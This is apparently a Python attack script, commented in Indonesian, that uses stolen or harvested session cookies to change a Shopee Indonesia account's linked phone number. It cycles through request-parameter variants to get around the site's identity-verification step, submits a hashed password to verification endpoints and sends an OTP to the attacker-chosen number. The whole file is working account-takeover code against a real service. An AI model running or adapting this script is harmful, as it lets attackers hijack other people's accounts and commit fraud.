# -*- coding: utf-8 -*-
"""cp_final.py — flow final: ivs_utoken langsung ke verify_payment_init.

Bukti:
  - init_v2 -> ivs_utoken 428B (SUDAH ada challenge token)
  - ivs/methods -> 2 method, select OK
  - token/verify -> 90309999 (tembok)
  - verify_payment_init -> 10002 (butuh IVS state)

Hipotesis: 10002 muncul karena `ivs_utoken` BELUM DIPAKAI.
Coba: pass u_token / ivs_utoken / utoken ke verify_payment_*.

Juga coba urutan alternatif: precheck DULU, baru verify.
"""
import json, sys, urllib.request, urllib.error, time, hashlib

CK = sys.argv[1] if len(sys.argv) > 1 else "ck_1553.txt"
NEWPHONE = sys.argv[2] if len(sys.argv) > 2 else "6283191104601"
PASSWORD = sys.argv[3] if len(sys.argv) > 3 else "qwertyui123"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
ck = open(CK).read().strip()
CSRF = ""
for p in ck.split(";"):
    if p.strip().startswith("csrftoken="):
        CSRF = p.split("=", 1)[1].strip()
M = "/api/v4/account/management"
st = {}


def log(*a):
    print(*a, flush=True)


def call(path, body=None, method=None):
    h = {"Cookie": ck, "User-Agent": UA, "X-API-SOURCE": "pc",
         "X-Requested-With": "XMLHttpRequest",
         "Referer": "https://shopee.co.id/user/account/settings",
         "Content-Type": "application/json", "Accept": "application/json",
         "X-CSRFToken": CSRF, "X-Shopee-Language": "id"}
    d = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request("https://shopee.co.id" + path, data=d, headers=h,
                                 method=method or ("POST" if body is not None else "GET"))
    try:
        r = urllib.request.urlopen(req, timeout=50)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}
    except Exception as ex:
        return 0, {"exc": str(ex)[:60]}


log(f"=== CP FINAL — {CK} → {NEWPHONE} ===")

# init
s, j1 = call(f"{M}/change_phone_init", {})
SEQ = (j1.get("data") or {}).get("seq_no")
AUTH = (j1.get("data") or {}).get("auth_required")
s, j2 = call(f"{M}/change_phone_init_v2", {})
D2 = j2.get("data") or {}
UT = D2.get("ivs_utoken") or ""
CPT = D2.get("change_phone_token") or ""
log(f"[0] seq={SEQ} auth={AUTH} ut={len(UT)}B cp={len(CPT)}B")

# ===== A. precheck DULU (beberapa akun precheck bisa tanpa verify) =====
log("\n[A] precheck SEBELUM verify")
pre_variants = [
    ("p", {"phone": NEWPHONE}),
    ("p_seq", {"phone": NEWPHONE, "seq_no": SEQ}),
    ("p_cp", {"phone": NEWPHONE, "change_phone_token": CPT}),
    ("p_ut", {"phone": NEWPHONE, "ivs_utoken": UT}),
    ("p_all", {"phone": NEWPHONE, "seq_no": SEQ, "change_phone_token": CPT,
               "ivs_utoken": UT}),
]
PRE = None
for name, b in pre_variants:
    s, j = call(f"{M}/change_phone_precheck_v2", b)
    e = j.get("error")
    mark = "★" if e != 10002 else " "
    log(f"   {mark}[{name:6s}] err={e} {str(j.get('data'))[:110]}")
    if e == 0:
        PRE = j.get("data")
        st["precheck"] = PRE
        break
    time.sleep(0.4)

# ===== B. verify_payment_init dengan u_token =====
log("\n[B] verify_payment_init + ivs_utoken")
pw = hashlib.sha256(hashlib.md5(PASSWORD.encode()).hexdigest().encode()).hexdigest()
VPI = [
    ("u_token", {"seq_no": SEQ, "scenario": 1, "u_token": UT}),
    ("ivs_utoken", {"seq_no": SEQ, "scenario": 1, "ivs_utoken": UT}),
    ("utoken", {"seq_no": SEQ, "scenario": 1, "utoken": UT}),
    ("ut_only", {"u_token": UT, "scenario": 1}),
    ("full", {"seq_no": SEQ, "scenario": 1, "u_token": UT,
              "change_phone_token": CPT, "event": 2}),
]
ok_vpi = None
for name, b in VPI:
    s, j = call(f"{M}/verify_payment_init", b)
    e = j.get("error")
    mark = "★" if e != 10002 else " "
    log(f"   {mark}[{name:10s}] err={e} {str(j.get('data'))[:110]}")
    if e == 0:
        ok_vpi = (name, j.get("data"))
        st["vpi"] = ok_vpi
        break
    time.sleep(0.4)

# ===== C. kalau VPI OK, commit password =====
if ok_vpi:
    log("\n[C] verify_payment_commit")
    for name, b in (
        ("pw", {"seq_no": SEQ, "answer": pw, "scenario": 1}),
        ("pw_ut", {"seq_no": SEQ, "answer": pw, "scenario": 1, "u_token": UT}),
    ):
        s, j = call(f"{M}/verify_payment_commit", b)
        e = j.get("error")
        log(f"   [{name:6s}] err={e} {str(j.get('data'))[:110]}")
        if e == 0:
            st["pw_ok"] = j.get("data")
            log("   🟢 PASSWORD VERIFIED")
            break
        time.sleep(0.4)

# ===== D. commit password ke endpoint account/management/verify_password =====
if not st.get("pw_ok"):
    log("\n[D] alternatif verify_password")
    for p in (f"{M}/verify_password", "/api/v4/account/verify_password",
              f"{M}/password/verify"):
        s, j = call(p, {"password": pw, "seq_no": SEQ, "scenario": 1})
        e = j.get("error")
        log(f"   {p.split('/')[-1]:18s} err={e} {str(j.get('data'))[:100]}")
        if e == 0:
            st["pw_ok"] = j.get("data")
            break
        time.sleep(0.4)

# ===== E. kirim OTP =====
log("\n[E] OTP")
s, j = call("/api/v4/otp/get_settings_v2",
            {"operation": 0, "phone": NEWPHONE, "supported_channels": [1, 2],
             "support_session": False})
log(f"   settings: err={j.get('error')} {str(j.get('data'))[:110]}")
s, j = call("/api/v4/otp/send_vcode",
            {"phone": NEWPHONE, "channel": 1, "operation": 0, "force_channel": False,
             "supported_channels": [1, 2], "seed": ""})
log(f"   send: err={j.get('error')} {str(j.get('data'))[:130]}")
st["send"] = j.get("data")

json.dump(st, open("cp_final_state.json", "w"), indent=1)
log("\n=== RINGKASAN ===")
log(f"  precheck   : {'✅' if st.get('precheck') else '❌'}")
log(f"  vpi        : {'✅' if st.get('vpi') else '❌'}")
log(f"  password   : {'✅' if st.get('pw_ok') else '❌'}")
log(f"  OTP kirim  : {'✅' if (st.get('send') or {}).get('seed') else '❌'}")
